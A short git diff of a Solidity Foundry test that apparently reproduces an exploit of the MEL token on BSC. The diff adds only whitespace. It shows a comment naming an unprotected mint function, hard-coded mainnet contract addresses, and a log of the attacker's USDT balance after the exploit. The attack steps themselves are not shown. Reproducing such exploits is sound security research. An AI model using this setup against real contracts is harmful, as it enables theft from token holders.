@@ -12,10 +12,13 @@ import "./../interface.sol";
 // critical function lack of access control
 
 interface IMEL is IERC20 {
+
     function mint(address account, uint256 amount, string memory txId) external returns (bool);
+
 }
 
 contract ContractTest is Test {
+
     IMEL MEL = IMEL(0x9A1aEF8C9ADA4224aD774aFdaC07C24955C92a54);
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
@@ -42,4 +45,5 @@ contract ContractTest is Test {
             "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()
         );
     }
+
 }
